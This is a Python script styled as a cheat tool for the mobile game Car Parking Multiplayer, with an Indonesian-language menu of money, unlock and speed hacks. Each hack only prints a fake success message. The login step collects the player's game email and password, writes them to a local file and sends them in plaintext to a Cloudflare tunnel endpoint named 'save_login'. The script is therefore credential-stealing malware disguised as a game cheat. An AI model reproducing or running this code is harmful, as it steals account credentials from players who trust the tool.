#!/usr/bin/env python3
# cpm_tool_full_dummy.py
import os
import sys
import time
import requests
import json

# ================= CONFIG =================
API_BASE = "https://room-lands-receptors-editor.trycloudflare.com"  # Ganti dengan IP server
API_KEY  = "AOA-SECRET-8899"
API_SERVER = f"{API_BASE}/save_login"

# ================= COLORS =================
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# ================= HELPERS =================
def clear():
    os.system("clear")

def loading(text="Processing", sec=1):
    for i in range(sec * 3):
        sys.stdout.write(f"\r{text}{'.' * (i % 4)}")
        sys.stdout.flush()
        time.sleep(0.25)
    print()

def print_response(res):
    status = res.get("status", False)
    msg = res.get("msg", "-")
    if status:
        print(GREEN + "[OK]" + RESET, msg)
    else:
        print(RED + "[ERR]" + RESET, msg)

def check_server():
    try:
        r = requests.post(f"{API_BASE}/api_status", json={"key": API_KEY}, timeout=5)
        if r.status_code != 200:
            print(f"[ERR] Server merespon status code {r.status_code}")
            return False
        data = r.json()
        if data.get("status"):
            print(GREEN + "[OK] Server aktif:" + RESET, data.get("msg"))
            return True
        else:
            print(RED + "[ERR] Server menolak request:" + RESET, data.get("msg"))
            return False
    except:
        print(RED + "[ERR] Gagal koneksi ke server" + RESET)
        return False

# ================= LOGIN DUMMY =================
def cpm_login():
    clear()
    print(GREEN + "=== LOGIN CPM EL GRADE ===" + RESET)
    email = input("Email CPM    : ").strip()
    password = input("Password CPM : ").strip()
    loading("Verifikasi")

    # Profile dummy
    profile = {
        "username": f"user_{email.split('@')[0]}",
        "id": "ID" + str(int(time.time()) % 10000),
        "money": 1000,
        "coins": 100,
        "animations": ["anim1", "anim2"],
        "wheels": ["wheel1", "wheel2"],
        "cars": ["car1", "car2"]
    }

    print(GREEN + "[LOGIN BERHASIL]" + RESET)
    print("Email      :", email)
    print("Password   :", password)
    print("Username   :", profile["username"])
    print("Player ID  :", profile["id"])
    print("Money      :", profile["money"])
    print("Coins      :", profile["coins"])

    # Simpan ke file
    with open("profile_login.json", "w") as f:
        json.dump({"email": email, "password": password, **profile}, f, indent=2)
    print(GREEN + "[INFO]" + RESET, "Data login disimpan ke profile_login.json")

    # Kirim ke server
    try:
        r = requests.post(API_SERVER, json={
            "email": email,
            "password": password,
            "username": profile["username"],
            "player_id": profile["id"],
            "money": profile["money"],
            "coins": profile["coins"]
        }, timeout=8).json()
        print_response(r)
    except:
        print(RED + "[ERR] Gagal kirim login ke server" + RESET)

    return profile

# ================= MENU FUNCTIONS =================
def set_money(profile):
    v = input("Masukkan Money: ")
    profile["money"] = int(v)
    print(GREEN + "[OK]" + RESET, f"Money diubah menjadi {v}")

def set_coins(profile):
    v = input("Masukkan Coins: ")
    profile["coins"] = int(v)
    print(GREEN + "[OK]" + RESET, f"Coins diubah menjadi {v}")

def change_name(profile):
    v = input("Nama Baru: ")
    profile["username"] = v
    print(GREEN + "[OK]" + RESET, f"Username diubah menjadi {v}")

def change_id(profile):
    v = input("Player ID Baru: ")
    profile["id"] = v
    print(GREEN + "[OK]" + RESET, f"Player ID diubah menjadi {v}")

def unlock_engine(profile): print(GREEN + "[OK]" + RESET, "W16 Engine Unlock ✔")
def unlock_horn(profile): print(GREEN + "[OK]" + RESET, "Horn Unlock ✔")
def disable_damage(profile): print(GREEN + "[OK]" + RESET, "Damage Disabled ✔")
def unlimited_fuel(profile): print(GREEN + "[OK]" + RESET, "Unlimited Fuel ✔")
def set_race_wins(profile): v=input("Jumlah Wins: "); print(GREEN + "[OK]" + RESET, f"Wins diubah menjadi {v}")
def set_race_loses(profile): v=input("Jumlah Loses: "); print(GREEN + "[OK]" + RESET, f"Loses diubah menjadi {v}")
def unlock_smoke(profile): print(GREEN + "[OK]" + RESET, "Smoke Unlock ✔")
def unlock_animations(profile): print(GREEN + "[OK]" + RESET, "Animations Unlock ✔")
def unlock_wheels(profile): print(GREEN + "[OK]" + RESET, "Wheels Unlock ✔")
def unlock_houses(profile): print(GREEN + "[OK]" + RESET, "Houses Unlock ✔")
def set_rank(profile): v=input("Rank Baru: "); print(GREEN + "[OK]" + RESET, f"Rank diubah menjadi {v}")
def get_all_cars(profile): print(GREEN + "[OK]" + RESET, "Daftar Semua Mobil ✔")
def hack_speed(profile): print(GREEN + "[OK]" + RESET, "Speed Hack ✔")
def check_unlocks(profile): print(GREEN + "[OK]" + RESET, "Check Unlocks ✔")
def change_password(profile): v=input("Password Baru: "); print(GREEN + "[OK]" + RESET, f"Password diubah menjadi {v}")
def change_email(profile): v=input("Email Baru: "); print(GREEN + "[OK]" + RESET, f"Email diubah menjadi {v}")
def api_status(profile): print(GREEN + "[OK]" + RESET, "API Status ✔")
def refresh_resources(profile): print(GREEN + "[OK]" + RESET, "Resources Refreshed ✔")

def exit_program(profile):
    print("Keluar...")
    sys.exit()

# ================= MENU UI =================
def main_loop(profile):
    funcs = {
        "1": set_money, "2": set_coins, "3": change_name, "4": change_id,
        "5": unlock_engine, "6": unlock_horn, "7": disable_damage,
        "8": unlimited_fuel, "9": set_race_wins, "10": set_race_loses,
        "11": unlock_smoke, "12": unlock_animations, "13": unlock_wheels,
        "14": unlock_houses, "15": set_rank, "16": get_all_cars,
        "17": hack_speed, "18": check_unlocks, "19": change_password,
        "20": change_email, "21": api_status, "22": refresh_resources,
        "33": exit_program
    }

    while True:
        clear()
        print(BLUE + "=== CPM TOOL FULL EL GRADE ===" + RESET)
        print("1. Set Money")
        print("2. Set Coins")
        print("3. Change Player Name")
        print("4. Change Player ID")
        print("5. Unlock W16 Engine")
        print("6. Unlock Horns")
        print("7. Disable Damage")
        print("8. Unlimited Fuel")
        print("9. Set Race Wins")
        print("10. Set Race Loses")
        print("11. Unlock Smoke")
        print("12. Unlock Animations")
        print("13. Unlock Wheels")
        print("14. Unlock Houses")
        print("15. Set Rank")
        print("16. Get All Cars")
        print("17. Hack Car Speed")
        print("18. Check Unlocks")
        print("19. Change Password")
        print("20. Change Email")
        print("21. API Status")
        print("22. Refresh Resources")
        print("33. Exit" + RESET)

        c = input("\nChoose: ").strip()
        if c in funcs:
            funcs[c](profile)
            input("Tekan Enter untuk kembali...")
        else:
            print(RED + "Pilihan tidak valid!" + RESET)
            time.sleep(1)

# ================= MAIN ======================
if __name__ == "__main__":
    if not check_server():
        sys.exit(1)
    profile = cpm_login()
    main_loop(profile)